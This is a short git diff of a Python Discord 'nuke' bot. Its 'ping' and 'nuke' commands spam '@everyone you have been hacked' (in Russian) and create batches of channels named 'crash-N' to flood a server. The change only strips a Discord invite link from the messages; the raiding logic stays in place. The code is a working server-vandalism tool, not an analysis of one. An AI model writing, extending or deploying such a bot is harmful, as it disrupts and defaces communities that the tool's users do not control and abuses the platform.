@@ -25,7 +25,7 @@ async def on_ready():
 
 @bot.command()
 async def ping(ctx):
-    await ctx.send("@everyone вы были взломаны https://discord.gg/W9fRBPUGbV")
+    await ctx.send("@everyone вы были взломаны")
 
 @bot.command()
 async def nuke(ctx):
@@ -49,7 +49,7 @@ async def nuke(ctx):
         for _ in range(10):
             async def create_ch(idx):
                 ch = await guild.create_text_channel(f"crash-{idx}")
-                await ch.send("@everyone вы были взломаны https://discord.gg/W9fRBPUGbV")
+                await ch.send("@everyone вы были взломаны")
             tasks.append(create_ch(i))
             i += 1
         await asyncio.gather(*tasks, return_exceptions=True)
